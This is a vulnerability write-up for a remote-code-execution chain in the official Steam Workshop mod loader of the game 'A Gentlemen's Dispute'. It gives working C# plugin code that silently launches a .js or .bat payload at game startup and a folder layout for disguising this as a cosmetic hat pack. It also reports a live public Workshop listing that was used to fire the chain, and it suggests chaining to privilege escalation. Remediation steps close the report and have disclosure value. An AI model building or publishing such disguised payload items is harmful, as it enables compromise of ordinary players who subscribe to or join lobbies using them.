# A Gentlemen's Dispute — Steam Workshop Plugin RCE

**Product:** A Gentlemen's Dispute  
**Steam appid:** 2820700  
**Developer / publisher:** Blast Furnace Games  
**Engine:** Unity Mono (`A Gentlemen's Dispute.exe` + `A Gentlemen's Dispute_Data\Managed\AGD.dll`)  
**Class:** Official Steam Workshop plugin `Assembly.Load(byte[])` → `IModPlugin.OnLoad` → `Process.Start` of a listing sibling  
**CWE:** CWE-494 (download of code without integrity check), CWE-829 (inclusion of functionality from untrusted control sphere)  
**Status:** UNIQUE_CONFIRMED / FIRE on a stock Windows client  
**Click count:** 1-click Workshop (subscribe + launch). Join is an extra consent click. Dedicated servers skip Workshop DLLs.  
**Date of dump:** 2026-10-23  

This report is a technical PoC write-up. Payloads were never executed on the research host. The game binary was never launched on the research host.

---

## 1. Summary

A Gentlemen's Dispute ships an official mod loader. Any subscribed Workshop folder that contains a `mod.json` with `entryAssembly` + `entryType` is treated as a plugin. The client reads that DLL as raw bytes and loads it with `Assembly.Load(byte[])`. There is no authenticode check, no AppDomain sandbox, and no capability prompt. The type named in `entryType` must implement `AGD.ModAPI.IModPlugin`. The loader then calls `OnLoad(IModContext)`.

A public Workshop item that looks like a hat, weapon, perk, map, or utility can therefore ship a plugin DLL whose `OnLoad` starts a sibling `.js`, `.hta`, `.bat`, or any other Windows-associated type from the same folder. Steam delivers that folder under `steamapps\workshop\content\2820700\<id>\`. Launching the stock client is enough.

Dedicated servers skip Workshop plugins (`ModAssemblyLoader.ShouldSkipCode` is dedicated **and** `IsWorkshop`). The listen-host client and every joining client that consented to the lobby's Workshop set load the DLL.

Live FIRE listing used to prove the chain: [Pocket Watch Round Timer](https://steamcommunity.com/sharedfiles/filedetails/?id=3825802797) (`3825802797`).

---

## 2. Affected product

| Field | Value |
|-------|-------|
| Store | https://store.steampowered.com/app/2820700/ |
| Workshop hub | https://steamcommunity.com/app/2820700/workshop/ |
| Hub types | Map, Item, Perk, Emote, Utility, Cosmetic, code |
| Install (this dump) | `E:\SteamLibrary\steamapps\common\A Gentlemen's Dispute` |
| Workshop content | `E:\SteamLibrary\steamapps\workshop\content\2820700` |
| Plugin API | `AGD.ModAPI.IModPlugin` (`OnLoad` / `OnUnload`) |
| Manifest | `mod.json` (`entryAssembly`, `entryType`, `enabled`) |
| Anticheat | none |

The game is an 8-player parlor brawler. Workshop items are hats, weapons, perks, maps, emotes, and utilities. The official loader is first-party, not BepInEx. A third-party Thunderstore / BepInEx path exists in the wild; this PoC uses only the stock `AGD.dll` path.

---

## 3. Vulnerability

### 3.1 Root cause

`ModAssemblyLoader.LoadSingleMod` trusts a Workshop `mod.json` and loads the named assembly as code:

1. `File.ReadAllBytes(Path.Combine(RootPath, entryAssembly))`
2. `Assembly.Load(byte[])`
3. `Assembly.GetType(entryType, throwOnError: true)` must implement `IModPlugin`
4. `Activator.CreateInstance` → `IModPlugin.OnLoad(IModContext)`

`IModContext.InstallPath` is the pack root (`RootPath`). Byte-loaded assemblies have an empty `Location`, so any sibling path has to be built from `InstallPath`.

There is no hash pin, no publisher allow-list, and no OS-exec capability gate. `ModJson.enabled` defaults to true. `WarnUntrustedCodeOnce` is a one-shot UI warning, not a block.

### 3.2 Stock trigger (subscribe + launch)

```
DisputeLib.GameSingleton.Awake
  → ModManager.LoadAtStartupRoutine
    → ModAssemblyLoader.LoadEnabledMods
      → BeginLoad
        → LocalModProvider.Scan          (install Mods\, isWorkshop=false)
        → persistent mods path           (isWorkshop=false)
        → WorkshopModProvider.GetInstalledModFolders
             SteamUgcService.GetInstalledItemFolders   (isWorkshop=true)
      → each folder with mod.json
           JsonConvert.DeserializeObject<ModJson>
           HasPlugin = entryAssembly AND entryType non-whitespace
      → FinishLoad → GetEnabledValidMods → LoadSingleMod
           ShouldSkipCode?  dedicated AND IsWorkshop → skip
           else File.ReadAllBytes → Assembly.Load → OnLoad
```

Victim steps:

1. Subscribe to the public Workshop item.
2. Wait until Steam writes `steamapps\workshop\content\2820700\<id>\mod.json`.
3. Launch **A Gentlemen's Dispute** (`A Gentlemen's Dispute.exe`). Do not pass dedicated flags.
4. `OnLoad` runs during startup. Default `enabled` is true. If the in-game Mods row is off, turn it on and relaunch.

### 3.3 Join path (extra consent click)

Lobby data keys:

- `workshop` — comma-separated published file ids
- `mods` — comma-separated mod ids

`WorkshopJoinGate.GrantConsent(CSteamID)` is the extra click. `EnsureLobbyContent` then downloads required items and `Scan` runs on the **joining client**. Dedicated skip does not apply to that client.

### 3.4 Dedicated-server skip

`ShouldSkipCode` is true only when `GameSingleton.IsDedicatedServer()` **and** `DiscoveredMod.IsWorkshop`. Do not put this pack in a dedicated-server plugins folder. The payload is intended to fire on the subscribe-launch client and on joining clients.

---

## 4. Authorable listing shape

`AGD.Modding.ModJson` fields the loader actually reads: `modId`, `name`, `version`, `enabled`, `entryAssembly`, `entryType`, `minGameVersion`, `workshopFileId`, `clientOnly`. Extra keys (`schemaVersion`, `contentApiVersion`) are ignored by Newtonsoft.

Live community shape (Thunderstore HelveticaMods Mod Manager 2.1.0):

```json
{
  "schemaVersion": 1,
  "modId": "mod-manager",
  "name": "Mod Manager",
  "version": "2.1.0",
  "enabled": true,
  "entryAssembly": "ModManager.dll",
  "entryType": "ModManager.Plugin"
}
```

PoC cosmetic pack used the same keys with a `bin/` relative path (also documented in the in-game README):

```json
{
  "schemaVersion": 2,
  "modId": "pilgrim-hat",
  "name": "Pilgrim Hat",
  "version": "1.0.0",
  "enabled": true,
  "contentApiVersion": 1,
  "entryAssembly": "bin/PilgrimHat.dll",
  "entryType": "PilgrimHat.Plugin"
}
```

Folder layout (clone of a live Blindfold cosmetic, plus glue):

```
<workshop item>/
  mod.json
  cosmetics.json
  prefabs.json
  loc/en.json
  assets/icon.png
  bundles/blindfold
  preview.png
  bin/PilgrimHat.dll
  OpenPilgrKit.js          ← sibling the sink ShellExecutes
```

Steam Workshop Config tags on the hub: `perk`, `item`, `map`, `mixed`, `localization`, `code`, `gameversion`. Utility / Emote / Cosmetic also appear on browse.

---

## 5. Proof-of-concept glue

The plugin is ordinary `IModPlugin`. `OnLoad` ShellExecutes a sibling associated type from `context.InstallPath`. CSC target is .NET Framework 4.0 (`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe`) with Managed refs from `A Gentlemen's Dispute_Data\Managed`.

```csharp
using System;
using System.Diagnostics;
using System.IO;
using AGD.ModAPI;

namespace PilgrimHat
{
    public class Plugin : IModPlugin
    {
        public void OnLoad(IModContext context)
        {
            try
            {
                string root = context != null ? context.InstallPath : null;
                if (string.IsNullOrEmpty(root))
                    return;
                string payload = Path.Combine(root, "OpenPilgrKit.js");
                if (!File.Exists(payload))
                    return;
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = payload;
                psi.WorkingDirectory = root;
                psi.UseShellExecute = true;
                Process.Start(psi);
            }
            catch
            {
            }
        }

        public void OnUnload()
        {
        }
    }
}
```

`UseShellExecute = true` means Windows opens the sibling by file association. A `.js` (WScript/JScript), `.hta` (mshta), `.bat`/`.cmd` (cmd), `.vbs`, `.msi`, or `.exe` all work. The research cooks wrap `cre.sgn` into unique `.js` / `.hta` names. No `calculator:` URI.

The DLL itself is unsandboxed .NET in the game AppDomain. `Process.Start` of a sibling is the filmed payload; in-process shellcode from the same `OnLoad` is equally available.

Live FIRE listing **Pocket Watch Round Timer** used `SnapPockeTag.bat` from `OnLoad` with the same `ProcessStartInfo` pattern.

---

## 6. Reproduction

Do not execute listing payloads on the research host. Do not launch `A Gentlemen's Dispute.exe` on the research host.

On a filming client that does not have the cook tree:

1. Subscribe to a public Workshop item whose folder matches §4 (or the live Pocket Watch listing `3825802797`).
2. Wait until `steamapps\workshop\content\2820700\<id>\mod.json` exists.
3. Launch A Gentlemen's Dispute from Steam. No dedicated flags.
4. `GameSingleton.Awake` loads enabled Workshop plugins. `OnLoad` starts the sibling.

Join-forced film (second account, no pre-subscribe):

1. Host a Friends listen lobby with the pack enabled. Lobby keys `workshop` + `mods`.
2. Joining account accepts `WorkshopJoinGate.GrantConsent`.
3. Steam downloads the item. The joining **client** scans and loads the plugin.

Local cook trees (not uploaded from this pass) live under:

`E:\PoCCreator\projects\AGentlemensDisputeRCE\reality\workshop\page\<slug>\`

HOW_TO_RUN: `E:\PoCCreator\projects\AGentlemensDisputeRCE\poc\HOW_TO_RUN.md`

---

## 7. What this is not

| Candidate | Result |
|-----------|--------|
| `SteamUgcService.OpenPage` / overlay `steamcommunity` / `steam://url/SteamWorkshopPage` | first-party OpenURL, not UGC-fed |
| SocialLinks / Wishlist | first-party |
| `GameSingleton.OpenLogsFolder` `Process.Start` | first-party logs folder |
| `ModPrefabRegistry` / `ModSceneBundleRegistry` `AssetBundle.LoadFromFile` | content load, not OS exec |
| `AGD.MapContract.dll` | DumpSinks empty of UGC exec |
| BepInEx / Thunderstore ZeppelinGames kit | third-party; unique chain is official `AGD.dll` |
| File-drop of a `.bat` with no `entryAssembly` | unfinished — `HasPlugin` is false, listing skipped |
| Dedicated-server start | Workshop DLLs skipped |

---

## 8. Impact

Anyone who can publish a Steam Workshop item for appid 2820700 executes arbitrary code in the process of every stock client that:

- subscribes and launches, or
- joins a lobby that requires that item and clicks consent.

The listing presents as a normal hat / weapon / perk / map / utility. Steam delivers the folder. The official loader treats the DLL as trusted plugin code. No capability prompt. Default enabled.

Windows user-level RCE in the game process. Can be chained to a local LPE (BrokenPipe-class `steamservice.exe` install-script path bind, or any other user→SYSTEM primitive) after the plugin runs.

F2P demo existed; retail is paid. Workshop is live. No anticheat.

---

## 9. Remediation

1. Do not `Assembly.Load` / `LoadFrom` untrusted Workshop bytes into the game AppDomain.
2. If plugins stay, load them in a restricted context: no `Process.Start`, no `Application.OpenURL`, no P/Invoke, no `Assembly.Load*`. Allow-list publisher certs.
3. If `Process.Start` / `OpenURL` remain in the plugin API, restrict to `http`/`https` and never `UseShellExecute` a listing path.
4. Require an in-game capability prompt (process / files / network) **before** `Assembly.Load`, not a one-shot `WarnUntrustedCodeOnce`.
5. Keep `ShouldSkipCode` on dedicated. Also skip Workshop code on listen-host until the player explicitly enables that item **this session**.
6. Join: do not auto-load a required plugin after consent-download; require a separate enable.

---

## 10. References

- Unique-method write-up: `E:\PoCCreator\data\chains\2820700-UNIQUE-METHOD.md`
- Hunt dump: `E:\PoCCreator\projects\AGentlemensDisputeRCE\poc\rce-hunt.md`
- Filming: `E:\PoCCreator\projects\AGentlemensDisputeRCE\poc\HOW_TO_RUN.md`
- Gadget class: `assembly_load_plugin` in `E:\PoCCreator\data\unique-gadgets.yaml`
- Live FIRE listing: https://steamcommunity.com/sharedfiles/filedetails/?id=3825802797
- Hub: https://steamcommunity.com/app/2820700/workshop/
- Store: https://store.steampowered.com/app/2820700/

Cooked local packs (not uploaded this pass): `E:\PoCCreator\projects\AGentlemensDisputeRCE\reality\workshop\page\`
